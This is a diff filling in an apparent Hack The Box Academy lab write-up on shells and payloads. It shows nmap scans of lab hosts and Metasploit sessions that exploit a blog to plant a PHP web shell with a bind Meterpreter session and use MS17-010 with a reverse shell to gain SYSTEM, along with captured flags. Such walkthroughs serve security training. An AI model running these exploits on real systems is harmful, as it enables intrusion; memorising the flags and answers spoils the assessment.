@@ -5,7 +5,7 @@
 * Difficulty: Medium
 * Category: Offensive
 * Time estimate: 2 days
-* Date: DD-MM-YYYY
+* Date: 02-01-2023
 * Author: [DjikstraCS](https://github.com/DjikstraCS)
 
 ---
@@ -789,20 +789,104 @@ Nmap done: 1 IP address (1 host up) scanned in 61.15 seconds
 *Hint: This host seems to allow war files to be uploaded. Maybe a certain kind of payload could be crafted....*
 
 ```
+┌─[htb-student@skills-foothold]─[~]
+└──╼ $sudo nmap -n -sV -sC 172.16.1.11
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 04:54 EST
+Nmap scan report for 172.16.1.11
+Host is up (0.11s latency).
+Not shown: 989 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: Inlanefreight
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
+515/tcp  open  printer       Microsoft lpd
+1801/tcp open  msmq?
+2103/tcp open  msrpc         Microsoft Windows RPC
+2105/tcp open  msrpc         Microsoft Windows RPC
+2107/tcp open  msrpc         Microsoft Windows RPC
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: SHELLS-WINSVR
+|   NetBIOS_Domain_Name: SHELLS-WINSVR
+|   NetBIOS_Computer_Name: SHELLS-WINSVR
+|   DNS_Domain_Name: shells-winsvr
+|   DNS_Computer_Name: shells-winsvr
+|   Product_Version: 10.0.17763
+|_  System_Time: 2023-02-02T09:55:37+00:00
+|_ssl-date: 2023-02-02T09:55:43+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=shells-winsvr
+| Not valid before: 2023-02-01T09:10:26
+|_Not valid after:  2023-08-03T09:10:26
+8080/tcp open  http          Apache Tomcat 10.0.11
+|_http-title: Apache Tomcat/10.0.11
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-favicon: Apache Tomcat
+MAC Address: 00:50:56:B9:AC:D8 (VMware)
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+| smb2-time: 
+|   date: 2023-02-02T09:55:37
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: shells-winsvr
+|   NetBIOS computer name: SHELLS-WINSVR\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-02-02T01:55:37-08:00
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:ac:d8 (VMware)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 1h35m59s, deviation: 3h34m39s, median: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.50 seconds
 ```
 
-**Answer:** ``
+This one was solved with laudanum, just like section "Laudanum, One Webshell To Rule Them All"
+
+**Answer:** `dev-share`
 
 ### Question 3:
 ![](./attachments/Pasted%20image%2020230201205250.png)
-*Hint: Proper scanning prevents poor performance.....
+*Hint: Proper scanning prevents poor performance.....*
 
 ```
+┌─[htb-student@skills-foothold]─[~]
+└──╼ $sudo nmap -n -sV -sC blog.inlanefreight.local
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 04:52 EST
+Nmap scan report for blog.inlanefreight.local (172.16.1.12)
+Host is up (0.025s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
+|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
+|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Inlanefreight Gabber
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+MAC Address: 00:50:56:B9:6B:46 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 ```
 
-**Answer:** ``
+**Answer:** `ubuntu`
 
 ### Question 4:
 ![](./attachments/Pasted%20image%2020230201205400.png)
@@ -812,38 +896,250 @@ Nmap done: 1 IP address (1 host up) scanned in 61.15 seconds
 
 ```
 
-**Answer:** ``
+**Answer:** `php`
 
 ### Question 5:
 ![](./attachments/Pasted%20image%2020230201205420.png)
 *Hint: The use command in msf may be useful....*
 
-```
+We found a post on the website talking about an exploit for the site.
+
+![](./attachments/Pasted%20image%2020230202122820.png)
+
+The exploit is available in metasploit.
 
 ```
+┌─[htb-student@skills-foothold]─[~]
+└──╼ $sudo msfconsole
 
-**Answer:** ``
+[msf](Jobs:0 Agents:0) >> use 50064.rb
+[*] Using configured payload php/meterpreter/bind_tcp
+[msf](Jobs:0 Agents:0) exploit(50064) >> options
+
+Module options (exploit/50064):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   demo             yes       Blog password
+   Proxies                     no        A proxy chain of format type:host:por
+                                         t[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identi
+                                         fier, or hosts file with syntax 'file
+                                         :<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connec
+                                         tions
+   TARGETURI  /                yes       The URI of the arkei gate
+   USERNAME   demo             yes       Blog username
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/bind_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4444             yes       The listen port
+   RHOST                   no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PHP payload
+
+[msf](Jobs:0 Agents:0) exploit(50064) >> set RHOST 172.16.1.12
+RHOST => 172.16.1.12
+[msf](Jobs:0 Agents:0) exploit(50064) >> set USERNAME admin
+USERNAME => admin
+[msf](Jobs:0 Agents:0) exploit(50064) >> set PASSWORD admin123!@#
+PASSWORD => admin123!@#
+[msf](Jobs:0 Agents:0) exploit(50064) >> set VHOST blog.inlanefreight.local
+VHOST => blog.inlanefreight.local
+[msf](Jobs:0 Agents:0) exploit(50064) >> run
+
+[*] Got CSRF token: 01c4e36ff0
+[*] Logging into the blog...
+[+] Successfully logged in with admin
+[*] Uploading shell...
+[+] Shell uploaded as data/i/41IK.php
+[+] Payload successfully triggered !
+[*] Started bind TCP handler against 172.16.1.12:4444
+[*] Sending stage (39282 bytes) to 172.16.1.12
+[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2023-02-02 06:20:40 -0500
+
+(Meterpreter 1)(/var/www/blog.inlanefreight.local/data/i) > shell
+Process 2013 created.
+Channel 0 created.
+pwd
+/var/www/blog.inlanefreight.local/data/i
+cat /customscripts/flag.txt 
+B1nD_Shells_r_cool
+```
+
+**Answer:** `B1nD_Shells_r_cool`
 
 ### Question 6:
 ![](./attachments/Pasted%20image%2020230201205430.png)
 *Hint: It is always good to enumerate...*
 
 ```
+┌─[htb-student@skills-foothold]─[~]
+└──╼ $sudo nmap -n -sV -sC 172.16.1.13
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 06:30 EST
+Nmap scan report for 172.16.1.13
+Host is up (0.091s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: 172.16.1.13 - /
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+MAC Address: 00:50:56:B9:E7:C2 (VMware)
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+|_clock-skew: mean: 2h40m00s, deviation: 4h37m07s, median: 0s
+|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e7:c2 (VMware)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-02-02T11:30:45
+|_  start_date: 2023-02-02T11:03:17
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: SHELLS-WINBLUE
+|   NetBIOS computer name: SHELLS-WINBLUE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-02-02T03:30:45-08:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds
 ```
 
-**Answer:** ``
+**Answer:** `SHELLS-WINBLUE`
 
 ### Question 7:
 ![](./attachments/Pasted%20image%2020230201205437.png)
 *Hint: Take a close look at the enumeration results*
 
 ```
+┌─[htb-student@skills-foothold]─[~]
+└──╼ $sudo msfconsole
 
+[msf](Jobs:0 Agents:0) >> search eternal
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+[msf](Jobs:0 Agents:0) >> use 1
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name               Current Setting    Required  Description
+   ----               ---------------    --------  -----------
+   DBGTRACE           false              yes       Show extra debug trace info
+   LEAKATTEMPTS       99                 yes       How many times to try to le
+                                                   ak transaction
+   NAMEDPIPE                             no        A named pipe that can be co
+                                                   nnected to (leave blank for
+                                                    auto)
+   NAMED_PIPES        /usr/share/metasp  yes       List of named pipes to chec
+                      loit-framework/da            k
+                      ta/wordlists/name
+                      d_pipes.txt
+   RHOSTS                                yes       The target host(s), range C
+                                                   IDR identifier, or hosts fi
+                                                   le with syntax 'file:<path>
+                                                   '
+   RPORT              445                yes       The Target port (TCP)
+   SERVICE_DESCRIPTI                     no        Service description to to b
+   ON                                              e used on target for pretty
+                                                    listing
+   SERVICE_DISPLAY_N                     no        The service display name
+   AME
+   SERVICE_NAME                          no        The service name
+   SHARE              ADMIN$             yes       The share to connect to, ca
+                                                   n be an admin share (ADMIN$
+                                                   ,C$,...) or a normal read/w
+                                                   rite folder share
+   SMBDomain          .                  no        The Windows domain to use f
+                                                   or authentication
+   SMBPass                               no        The password for the specif
+                                                   ied username
+   SMBUser                               no        The username to authenticat
+                                                   e as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
+                                        ead, process, none)
+   LHOST     10.129.230.149   yes       The listen address (an interface may b
+                                        e specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOST 172.16.1.13
+RHOST => 172.16.1.13
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 172.16.1.5
+LHOST => 172.16.1.5
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
+
+[*] Started reverse TCP handler on 172.16.1.5:4444 
+[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
+[*] 172.16.1.13:445 - Built a write-what-where primitive...
+[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
+[*] 172.16.1.13:445 - Selecting PowerShell target
+[*] 172.16.1.13:445 - Executing the payload...
+[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 172.16.1.13
+[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2023-02-02 06:35:10 -0500
+
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 4028 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>type \Users\Administrator\Desktop\Skills-flag.txt 
+type \Users\Administrator\Desktop\Skills-flag.txt 
+One-H0st-Down!
 ```
 
-**Answer:** ``
+**Answer:** `One-H0st-Down!`
 
 ---
-
 **Tags:** [[Hack The Box Academy]]
